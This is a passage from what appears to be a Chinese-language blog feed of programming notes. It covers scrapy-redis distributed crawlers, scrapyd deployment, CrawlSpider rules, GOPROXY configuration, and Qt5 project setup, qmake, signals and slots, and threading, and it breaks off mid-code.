&#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: response.css(<span class="string">&#x27;title::text&#x27;</span>).extract_first(),</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: response.url,</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li>增加了一个redis_key的键，没有start_urls，因为分布式中，如果每台电脑都请求一次start_url就会重复</li><li>多了__init__方法，该方法不是必须的，可以手动指定allow_domains</li></ul><h2 id="分布式爬虫rediscrawlspider"><a class="markdownIt-Anchor" href="#分布式爬虫rediscrawlspider"></a> 分布式爬虫RedisCrawlSpider</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> Rule</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisCrawlSpider</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyCrawler</span>(<span class="params">RedisCrawlSpider</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Spider that reads urls from redis queue (myspider:start_urls).&quot;&quot;&quot;</span></span><br><span class="line">    name = <span class="string">&#x27;mycrawler_redis&#x27;</span></span><br><span class="line">    redis_key = <span class="string">&#x27;mycrawler:start_urls&#x27;</span></span><br><span class="line">    rules = (</span><br><span class="line">        <span class="comment"># follow all links</span></span><br><span class="line">        Rule(LinkExtractor(), callback=<span class="string">&#x27;parse_page&#x27;</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="comment"># Dynamically define the allowed domains list.</span></span><br><span class="line">        domain = kwargs.pop(<span class="string">&#x27;domain&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        self.allowed_domains = filter(<span class="literal">None</span>, domain.split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line">        super(MyCrawler, self).__init__(*args, **kwargs)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_page</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: response.css(<span class="string">&#x27;title::text&#x27;</span>).extract_first(),</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: response.url,</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h2 id="scrapy分布式部署"><a class="markdownIt-Anchor" href="#scrapy分布式部署"></a> scrapy分布式部署</h2><ul><li>项目路径：<a href="https://GitHub.com/scrapy/srcapyd">gitHub.com/scrapy/srcapyd</a></li></ul><h3 id="安装-3"><a class="markdownIt-Anchor" href="#安装-3"></a> 安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install scrapyd==1.2.0a1</span><br><span class="line">pip3 install scrapyd_client</span><br></pre></td></tr></table></figure><h3 id="配置和使用"><a class="markdownIt-Anchor" href="#配置和使用"></a> 配置和使用</h3><table><thead><tr><th>分布式部署</th><th></th></tr></thead><tbody><tr><td>配置远程主机</td><td><code>---scrapy.cfg----</code><br><code>[deploy]</code><br><code>url = http://47.95.229.68:6800/addversion.json</code><br><code>project = taobao</code></td></tr><tr><td>执行部署</td><td>scrapyd-deploy</td></tr><tr><td>远程调度API</td><td>访问<code>http://scrapyd.readthedocs.io/en/lasted/api.html</code></td></tr><tr><td>查看所有上传项目状态</td><td><code>curl http://47.95.229.68:6800/listprojects.json</code></td></tr><tr><td>项目版本</td><td><code>curl http://47.95.229.68:6800/listversions.json?project=taobao</code></td></tr><tr><td>远程任务启动</td><td><code>curl http://47.95.229.68:6800/schedule.json -d project=taobao -d spider=goods</code>请求多次可以开启多个进程</td></tr><tr><td>查看任务状态</td><td><code>curl http://47.95.229.68:6800/listjobs.json?project=taobao</code>  #可以查看job代号</td></tr><tr><td>任务取消</td><td><code>curl http://47.95.229.68:6800/cancel.json -d project=taobao -d job=job代号</code></td></tr></tbody></table><h3 id="api封装"><a class="markdownIt-Anchor" href="#api封装"></a> api封装</h3><ul><li><p>对scrapyd的封装，在python中就可以调度项目</p></li><li><p>项目地址：<a href="https://GitHub.com/djm/python-srcapyd-api">GitHub.com/djm/python-srcapyd-api</a></p></li><li><p>安装：<code>pip3 install python-srcapyd-api</code></p></li></ul><h1 id="crawlspider"><a class="markdownIt-Anchor" href="#crawlspider"></a> crawlspider</h1><ul><li>crawlspider是scrapy的另一种模板，可以自动从response中提取所有的满足规则的url地址，自动的构造自己requests请求，发送给引擎。</li></ul><h2 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h2><table><thead><tr><th>使用</th><th></th></tr></thead><tbody><tr><td>创建任务</td><td><code>scrapy genspider –t crawl 任务名 www.xxx.cn</code></td></tr></tbody></table><ul><li>注意点<ol><li>crawlspider中不能再有以parse为名字的方法，这个方法被用来实现基础url提取功能</li><li>一个Rule对象接收很多参数，包含LinkExtractor、callback、和follow</li><li>不指定callback，如果follow为true，满足该rule的url还会继续请求</li><li>如果多个rule都满足某一个url，则会从rules中选择第一个进行操作</li></ol></li></ul><h2 id="spider"><a class="markdownIt-Anchor" href="#spider"></a> spider</h2><table><thead><tr><th>spider</th><th></th></tr></thead><tbody><tr><td>rules</td><td>是一个元组或者是列表，包含的是Rule对象</td></tr><tr><td>Rule</td><td>表示规则，其中包含LinkExtractor,callback和follow</td></tr><tr><td>LinkExtractor</td><td>连接提取器，可以通过正则或者是xpath来进行url地址的匹配</td></tr><tr><td>callback</td><td>表示经过连接提取器提取出来的url地址响应的回调函数，可以没有，没有表示响应不会进行回调函数的处理（有需要数据提取时设置True）</td></tr><tr><td>follow</td><td>表示进过连接提取器提取的url地址对应的响应是否还会继续被rules中的规则进行提取，True表示会，Flase表示不会（有需要url提取时设置True）</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xxxxSpider</span>(<span class="params">CrawlSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;xxxx.cn&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://xxxx.cn/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    rules = (</span><br><span class="line">        Rule(LinkExtractor(allow=<span class="string">r&#x27;Items/&#x27;</span>), callback=<span class="string">&#x27;parse_item&#x27;</span>, follow=<span class="literal">True</span>),</span><br><span class="line">      Rule(LinkExtractor(restrict_xpath=<span class="string">&#x27;//div/li&#x27;</span>), callback=<span class="string">&#x27;parse_item&#x27;</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )       <span class="comment"># 注意：正则匹配的?是有特殊用途的，所以url中?要/?处理</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        i = &#123;&#125;</span><br><span class="line">        <span class="comment">#使用xpath进行数据的提取或者url地址的提取</span></span><br><span class="line">        <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure><table><thead><tr><th>LinkExtractor</th><th></th></tr></thead><tbody><tr><td>allow(re)</td><td>满足正则表达式的url会被提取，如果为空，则全部匹配</td></tr><tr><td>deny(re)</td><td>满足正则表达式，则一定不提取，优先级高于allow</td></tr><tr><td>allow_domains(domain)</td><td>会被提取的domains</td></tr><tr><td>deny_domains(domain)</td><td>不会被提取的domains</td></tr><tr><td>restrict_xpaths</td><td>使用xpath表达式，和allow共同作用过滤链接</td></tr></tbody></table><table><thead><tr><th>Rule</th><th></th></tr></thead><tbody><tr><td>link_extractor</td><td>linkextract对象用于定义需要提取的方法</td></tr><tr><td>callback</td><td>获得连接后，指定回调函数</td></tr><tr><td>follow(bool)</td><td>指定改规则的response是否需要跟进</td></tr><tr><td>process_links</td><td>指定该spider中那个函数将会被调用，从link_extractor中获取到链接列表时将会调用该函数，该方法主要用来过滤url</td></tr><tr><td>process_request</td><td>指定该spider中哪个函数将会被调用，改规则提取到每个request时都会调用该函数，用于过滤request</td></tr></tbody></table><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goproxy</title>
      <link href="/2020/07/21/goproxy/"/>
      <url>/2020/07/21/goproxy/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>goproxy配置</p></blockquote><a id="more"></a><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><ul><li>随着Go 1.13发布，GOPROXY默认值proxy.golang.org在中国大陆不能被访问。</li><li>go module公共代理仓库，代理并缓存go模块。你可以利用该代理来避免DNS污染导致的模块拉取缓慢或失败的问题，加速你的构建。</li><li>七牛云顺势推出<code>goproxy.cn</code>，以利于中国开发者更好使用Go Modules，它是非盈利性的项目</li></ul><h2 id="地址汇总"><a class="markdownIt-Anchor" href="#地址汇总"></a> 地址汇总</h2><ul><li><a href="https://mirrors.aliyun.com/goproxy/">https://mirrors.aliyun.com/goproxy/</a></li><li><a href="https://goproxy.cn">https://goproxy.cn</a></li></ul><h1 id="配置步骤"><a class="markdownIt-Anchor" href="#配置步骤"></a> 配置步骤</h1><h2 id="开启mod"><a class="markdownIt-Anchor" href="#开启mod"></a> 开启mod</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br></pre></td></tr></table></figure><h2 id="配置环境变量"><a class="markdownIt-Anchor" href="#配置环境变量"></a> 配置环境变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> GOPROXY=https://mirrors.aliyun.com/goproxy/</span><br></pre></td></tr></table></figure><ul><li>或者</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt5</title>
      <link href="/2020/07/17/Qt5/"/>
      <url>/2020/07/17/Qt5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>qt界面开发</p></blockquote><a id="more"></a><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><ul><li><a href="https://www.qt.io">官方网址</a></li><li>5.9是qt长期维护的版本</li></ul><h2 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h2><ul><li><p>安装qt程序会自动安装qt creater，插件根据使用情况选择，下载qt vs addin，方便qt在vs的开发。</p></li><li><p>linux环境配置</p><ul><li>sudo apt-get install -y g++ make</li><li>sudo apt-get install -y libgl1-mesa-dev</li><li>下载qt-source-linux-x64.run，并执行安装</li></ul></li></ul><h2 id="调式"><a class="markdownIt-Anchor" href="#调式"></a> 调式</h2><ul><li>windows需要下载并安装调式工具：windows10sdk，选择Debugging Tools for Windows</li></ul><p><img src="/images/pasted-58.png" alt="安装windows调式工具" /></p><ul><li><p>安装完成后，在<code>c:\Program Files(x86)\Windows Kits\10\Debuggers\x86</code>文件夹下，有一个<code>cdb.exe</code>的调式工具</p></li><li><p>配置Qt调式文件路径，如果调式工具是后安装的，这个需要手动配置。</p></li></ul><p><img src="/images/pasted-59.png" alt="配置Qt调式" /></p><ul><li>调试快捷键</li></ul><table><thead><tr><th>按键</th><th>说明</th></tr></thead><tbody><tr><td>F9</td><td>设置断点</td></tr><tr><td>F5</td><td>执行程序，知道运行到下一个断点</td></tr><tr><td>F10</td><td>单步执行，不进入函数</td></tr><tr><td>F11</td><td>单步执行，遇到函数则进入</td></tr></tbody></table><h1 id="qt项目介绍"><a class="markdownIt-Anchor" href="#qt项目介绍"></a> Qt项目介绍</h1><h2 id="创建项目"><a class="markdownIt-Anchor" href="#创建项目"></a> 创建项目</h2><ul><li>创建项目时有如下模板：Application、Library、其他项目、Non Qt project、Import Project</li></ul><h3 id="application模板"><a class="markdownIt-Anchor" href="#application模板"></a> Application模板</h3><ul><li>用于创建窗体应用</li></ul><table><thead><tr><th>项目类型</th><th>说明</th></tr></thead><tbody><tr><td>Qt Widgets Application</td><td>带有窗体的qt项目</td></tr><tr><td>Qt Console Application</td><td></td></tr><tr><td>Qt Quick Application</td><td></td></tr><tr><td>Qt Quick Controls 2 Application</td><td></td></tr></tbody></table><ul><li>窗体程序都继承与基类widgets，还有其派生类，对应不同窗体程序。<br />|widgets基类及其派生|说明|<br />|-|-|<br />|QMainWindow|主窗口，带菜单栏|<br />|QWidget|简单窗体|<br />|QDialog|对话框|</li></ul><h3 id="library模板"><a class="markdownIt-Anchor" href="#library模板"></a> Library模板</h3><ul><li>用于链接库程序</li></ul><table><thead><tr><th>项目类型</th><th>说明</th></tr></thead><tbody><tr><td>C++库</td><td>分为了共享库(win:dll文件，linux:so文件)和静态库</td></tr><tr><td>Qt Quick Extension Plugin</td><td></td></tr><tr><td>Qt creator插件</td><td></td></tr></tbody></table><h2 id="生成文件"><a class="markdownIt-Anchor" href="#生成文件"></a> 生成文件</h2><ul><li>源码文件<br /><img src="/images/pasted-57.png" alt="生成的源码文件目录" /></li></ul><table><thead><tr><th>文件名称</th><th>说明</th></tr></thead><tbody><tr><td>pro文件</td><td>用户项目配置，生成项目，编译文件</td></tr><tr><td>headers</td><td>存放头文件</td></tr><tr><td>sources</td><td>存放main.cpp和其他函数实现文件</td></tr><tr><td>forms</td><td>存放界面文件，可以用qt界面编辑器打开编辑，里面存的是xml</td></tr><tr><td>pro.user文件</td><td>存放用户的qt配置信息，配置的编译环境等信息，当更换其他电脑时，这个文件需要删除，在新的环境下重新生成</td></tr></tbody></table><ul><li>编译文件<ul><li>makefile文件：qt会自动生成makefile文件，指定了项目配置</li><li>ui_widget：将源码xml文件转成cpp文件</li><li>debug/release：qt编译连接后生成的obj、EXE、lib、cpp等文件</li></ul></li></ul><h2 id="项目配置"><a class="markdownIt-Anchor" href="#项目配置"></a> 项目配置</h2><h3 id="qt配置库和头文件"><a class="markdownIt-Anchor" href="#qt配置库和头文件"></a> Qt配置库和头文件</h3><h4 id="库文件准备"><a class="markdownIt-Anchor" href="#库文件准备"></a> 库文件准备</h4><ul><li>qt引用其他的库文件的配置，比如opencv。</li><li>头文件：<code>include</code>一般放在与项目同级别文件夹或者项目目录的src下；</li><li>库文件：<code>*.lib</code>文件放在项目路径的lib文件夹下；</li><li>动态链接库：<code>*.dll</code>文件放在项目路径的bin文件夹下；</li></ul><h4 id="引用库的配置"><a class="markdownIt-Anchor" href="#引用库的配置"></a> 引用库的配置</h4><ul><li>在qt项目右键，选择添加库，引用外部库，设置库文件路径；</li></ul><p><img src="/images/pasted-60.png" alt="添加库" /></p><ul><li>添加完成后，执行qmake，生成对应的makefile</li></ul><p><img src="/images/pasted-61.png" alt="执行qmake" /></p><ul><li>指定构建目录</li></ul><p><img src="/images/pasted-63.png" alt="配置build配置" /></p><ul><li>配置运行配置，路径(working directory)，让可执行文件找到对应的dll文件</li></ul><p><img src="/images/pasted-62.png" alt="配置run配置" /></p><h3 id="新增ui和qrc"><a class="markdownIt-Anchor" href="#新增ui和qrc"></a> 新增ui和qrc</h3><ul><li>项目右键新建，可以选择以下ui类型</li></ul><table><thead><tr><th>ui文件</th><th>说明</th></tr></thead><tbody><tr><td>Qt Item Model</td><td></td></tr><tr><td>Qt 设计师界面类</td><td>自动生成绑定好.h和.cpp的ui文件</td></tr><tr><td>Qt Designer From</td><td>仅生成ui文件，需要自己手动绑定</td></tr><tr><td>Qt Resource File</td><td></td></tr><tr><td>QML File</td><td></td></tr><tr><td>QtQuick UI File</td><td></td></tr><tr><td>JS File</td><td></td></tr></tbody></table><h3 id="vsqt配置项目"><a class="markdownIt-Anchor" href="#vsqt配置项目"></a> VS+Qt配置项目</h3><h4 id="输出-调试-库-头文件设置"><a class="markdownIt-Anchor" href="#输出-调试-库-头文件设置"></a> 输出、调试、库、头文件设置</h4><ul><li>右键项目，点击属性</li></ul><p><img src="/images/pasted-64.png" alt="项目属性配置" /></p><ul><li>常规：输出路径、平台命令集、</li><li>调试：工作目录、环境</li><li>C/C++：常规–&gt;附加包含目录</li><li>连接器：常规–&gt;输出文件、附加库目录、输入–&gt;附加依赖项、系统–&gt;子系统（子系统中：控制台表示从main为入口，显示黑窗口；窗口表示从winmain为入口，没有）</li></ul><h2 id="qmake"><a class="markdownIt-Anchor" href="#qmake"></a> QMake</h2><h3 id="qt编译经历的步骤"><a class="markdownIt-Anchor" href="#qt编译经历的步骤"></a> QT编译经历的步骤</h3><ul><li>编译pro生成makefile</li><li>jom或者make编译makefile<ul><li>生成界面源码：<code>uic.exe widgget.ui -o ui_widget.h</code></li><li>生成信号槽代码：<code>moc.exe widget.h moc_widget.cpp</code></li></ul></li></ul><h3 id="手动创建pro"><a class="markdownIt-Anchor" href="#手动创建pro"></a> 手动创建pro</h3><h4 id="创建pro"><a class="markdownIt-Anchor" href="#创建pro"></a> 创建pro</h4><ul><li>在空的项目文件目录中创建pro文件，写入下面的配置</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//添加QT的库</span></span><br><span class="line">QT += widgets core opencv ...</span><br><span class="line">QT -= <span class="built_in">console</span></span><br><span class="line"><span class="comment">//头文件的引用，默认是相对于输出路径，$$PWD代表pro所在文件路径</span></span><br><span class="line">INCLUDEPATH += ../../include</span><br><span class="line">INCLUDEPATH += $$PWD../../include</span><br><span class="line"><span class="comment">//库文件的引用</span></span><br><span class="line">LIBS += -L<span class="string">&quot;../../lib&quot;</span> -lopencv_world320</span><br><span class="line"><span class="comment">//指定生成目录</span></span><br><span class="line">DESTDIR += ../../bin</span><br><span class="line"><span class="comment">//指定生成可执行程序的名字</span></span><br><span class="line">TARGET = testq</span><br><span class="line"><span class="comment">//指定用到的源码，根据需求添加文件名即可</span></span><br><span class="line">SOURCES += main.cpp \</span><br><span class="line">        preson.h \</span><br><span class="line">        person.cpp</span><br><span class="line"><span class="comment">//添加控制台</span></span><br><span class="line">CONFIG += <span class="built_in">console</span></span><br></pre></td></tr></table></figure><ul><li><p>使用cmd，执行<code>qmake -o makefile testqmake.pro</code>，生成makefile</p><ul><li>如果提示缺少环境变量，可以在<code>c:\Program File(x86)\Microsoft Visual Studio 14.0\VC\vcvarsall.bat</code>中找到环境变量的配置。</li></ul></li><li><p>编译makefile：<code>jom /f makefile.Debug</code>，在debug文件夹中就有编译文件了。</p></li><li><p>上述语句可以写进批处理文件中</p></li></ul><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="keyword">call</span> &quot;c:\Program File(x86)\Microsoft Visual Studio <span class="number">14</span>.<span class="number">0</span>\VC\vcvarsall.bat&quot;</span><br><span class="line">qmake -o makefile testqmake.pro</span><br><span class="line">jom /f makefile.Debug</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><ul><li>在linux中，批处理文件添加执行权限：<code>chmod +x make.sh</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/opt/Qt5.9.0/5.9/gcc_64/bin:<span class="variable">$PATH</span></span><br><span class="line">qmake -o makefile testqmake.pro</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h4 id="配置qmake和jom执行路径"><a class="markdownIt-Anchor" href="#配置qmake和jom执行路径"></a> 配置qmake和jom执行路径</h4><ul><li>添加环境变量<code>c:\qt\qt5.9.0\5.9\msvc2015\bin</code>和<code>c:\qt\qt5.9.0\Tools\QtCreator\bin</code></li></ul><h4 id="导入vs开发环境"><a class="markdownIt-Anchor" href="#导入vs开发环境"></a> 导入vs开发环境</h4><ul><li>方法一：<code>qmake -tp vc testqmake.pro</code></li><li>方法二：使用vs插件导入</li></ul><h2 id="创建动态库和静态库"><a class="markdownIt-Anchor" href="#创建动态库和静态库"></a> 创建动态库和静态库</h2><ul><li>qt创建库的配置是<code>TEMPLATE=lib</code>，如果是静态库，还要加上配置<code>CONFIG += staticlib</code></li></ul><h3 id="qtcreator创建"><a class="markdownIt-Anchor" href="#qtcreator创建"></a> qtcreator创建</h3><ul><li>新建项目，选择Library–&gt;c++库–&gt;共享库，并设置类名：<code>testlib</code></li><li>pro文件会自动生成</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义宏，用以区分是库函数调用，还是执行调用</span></span><br><span class="line">DEFINES += TESTLIB_LIBRARY</span><br></pre></td></tr></table></figure><h4 id="pro手动创建"><a class="markdownIt-Anchor" href="#pro手动创建"></a> pro手动创建</h4><ul><li>手动创建pro文件，testlib.h、testlib.cpp文件</li><li>pro文件配置</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">SOURCES += testlib.cpp</span><br><span class="line">HEADERS += testlib.h</span><br><span class="line"><span class="comment">//生成文件名称</span></span><br><span class="line">TARGET=libdll</span><br><span class="line"><span class="comment">//动态库，如果是静态库，还需CONFIG += staticlib</span></span><br><span class="line">TEMPLATE=lib</span><br><span class="line">CONFIG += staticlib</span><br><span class="line"><span class="comment">//打开控制台，用以输出cout</span></span><br><span class="line">CONFIG += <span class="built_in">console</span></span><br><span class="line"><span class="comment">//定义宏，表示项目是库项目</span></span><br><span class="line">DEFINES += TESTLIB_LIBRARY</span><br><span class="line"><span class="comment">//输出路径</span></span><br><span class="line">DESTDIR = ../../lib</span><br><span class="line">DLLDESTDIR = ../../bin</span><br></pre></td></tr></table></figure><h3 id="调用动态库"><a class="markdownIt-Anchor" href="#调用动态库"></a> 调用动态库</h3><ul><li>引用头文件：<code>#include &lt;testlib.h&gt;</code></li><li>配置库路径：有两种方法，一个是在项目右键中选择添加库的方式配置，再一种是配置pro文件</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//配置库头文件路径</span></span><br><span class="line">INCLUDEPATH += ../../include</span><br><span class="line"><span class="comment">//配置库路径</span></span><br><span class="line">LIBS += -L../../lib -llibdll</span><br></pre></td></tr></table></figure><h2 id="debug和release编译设置"><a class="markdownIt-Anchor" href="#debug和release编译设置"></a> debug和release编译设置</h2><ul><li>pro配置：<code>CONFIG += debug_and_release</code>，这个是默认设置，即生成debug也生成release。</li><li>另一种配置写法</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">CONFIG(debug,debug|release)&#123;</span><br><span class="line"><span class="comment">//生成文件名称</span></span><br><span class="line">  TARGET = testdll_d <span class="comment">// debug_binary</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//生成文件名称</span></span><br><span class="line">  TARGET = testdll   <span class="comment">// release_binary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跨平台编译"><a class="markdownIt-Anchor" href="#跨平台编译"></a> 跨平台编译</h2><ul><li>Qt支持多种平台的开发，包括：win32、linux、mac、unix</li><li>测试是什么环境，可以在pro文件添加语句：<code>message($$QMAKESPEC)</code>，执行QMake，就可以显示了</li><li>查看支持的环境配置列表：<code>$QTPATH/Qt5.9.0/5.9/clang_64/mkspecs</code></li><li>pro配置：</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法一：</span></span><br><span class="line">win32:INCLUDEPATH += C:<span class="regexp">/mylibs/</span>headers</span><br><span class="line"><span class="comment">//方法二：</span></span><br><span class="line">win32&#123;</span><br><span class="line">  INCLUDEPATH += C:<span class="regexp">/mylibs/</span>headers</span><br><span class="line">&#125;</span><br><span class="line">!linux&#123;</span><br><span class="line">  message(<span class="string">&quot;not linux&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">win32|linux&#123;</span><br><span class="line">  message(<span class="string">&quot;win or linux&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="qt信号槽"><a class="markdownIt-Anchor" href="#qt信号槽"></a> Qt信号槽</h1><ul><li>信号槽是Qt中最关键的技术，作为<code>c++</code>程序，最关注的就是性能，对于信号槽的理解，对提升性能有很大的帮助。</li><li>槽是一个线程，排队执行信号，如果遇到时间复杂度高的任务，应该使用多线程处理。</li></ul><h2 id="信号槽的原理"><a class="markdownIt-Anchor" href="#信号槽的原理"></a> 信号槽的原理</h2><ul><li>类似windows的消息机制：在系统注册回调函数，指定类型消息调用，由主循环一直调用。</li><li>信号槽的区别是，不关心消息的类型，以及由谁接收。信号可以发送给不同的接收者。</li></ul><h3 id="组成"><a class="markdownIt-Anchor" href="#组成"></a> 组成</h3><ul><li>主要包含：信号函数（只发送，不需要知道接收者），槽函数（普通函数，只接收不管通信），QObject将两者绑定。</li></ul><h3 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h3><ul><li>绑定信号函数和槽函数</li><li>调用信号函数（将信号写入队列）</li><li>主线程从队列中获取信号</li></ul><p><img src="/images/pasted-65.png" alt="信号槽关系图" /></p><h3 id="代码实现"><a class="markdownIt-Anchor" href="#代码实现"></a> 代码实现</h3><ul><li>主循环的建立</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 入口程序建立主循环对象</span></span><br><span class="line"><span class="function">QApplication <span class="title">a</span><span class="params">(arg,argv)</span></span>;</span><br><span class="line"><span class="comment">// 在exec中，执行循环并处理相关调用，直至获取退出的操作</span></span><br><span class="line"><span class="keyword">return</span> a.exec();</span><br></pre></td></tr></table></figure><ul><li>信号槽的绑定<ul><li>设计器添加信号槽：拖动、添加，这里添加的是内部的信号槽函数，生成在ui的xml中</li><li>自定义实现的槽函数：当我们对界面改变时，而不想占用主线程的线程，防止一些异常的发生，就需要自己定义。在其他线程绑定槽函数手动添加信号槽。<ul><li>Q_OBJECT：在类中包含Q_OBJECT的宏，就会生成对应的moc代码</li><li>手动创建信号 signals</li><li>手动创建槽 public slots</li><li>两者绑定：<ul><li>方式一：设计器将槽函数绑定，在ui自动生成的cpp中加入自己定义的函数<code>QObject::connect(pushBtn,SIGNAL(clicked()),testsignalClass,SLOT(ViewSlot))</code></li><li>方式二：手动绑定。在类的构造器中添加：<code>connect(ui.testBtn,SIGNAL(clicked()),this,SLOT(TestSlot()))</code></li></ul></li></ul></li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">testsignal</span> :</span><span class="keyword">public</span> QWidget&#123;</span><br><span class="line">  Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  testsignal(QWidget *p = Q_NULLPTR);</span><br><span class="line">signals:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">ViewSig</span><span class="params">()</span></span>;  <span class="comment">//只需声明，信号函数会自动做定义</span></span><br><span class="line"><span class="keyword">public</span> slots:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">ViewSlot</span><span class="params">()</span></span>; <span class="comment">// 槽函数需要自己手动完成定义</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">TestSlot</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="qthread"><a class="markdownIt-Anchor" href="#qthread"></a> QThread</h1><ul><li>Qt实现了线程类，使用方法相对简单，只需要继承<code>QThread</code>类，重写<code>void run()&#123;&#125;</code>方法，处理线程功能即可。调用启动方法<code>void start()&#123;&#125;</code>。终止<code>void stop()&#123;&#125;</code>，不建议使用，线程手动退出可能会造成不可预知的错误，尽量使空间正常释放。一般是在run中的循环一次结束时判断是否需要退出，防止数据泄露。</li></ul><h2 id="利用信号执行槽函数"><a class="markdownIt-Anchor" href="#利用信号执行槽函数"></a> 利用信号执行槽函数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QtWidgets/QApplication&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QWidget&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QThread&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XThread</span>:</span><span class="keyword">public</span> 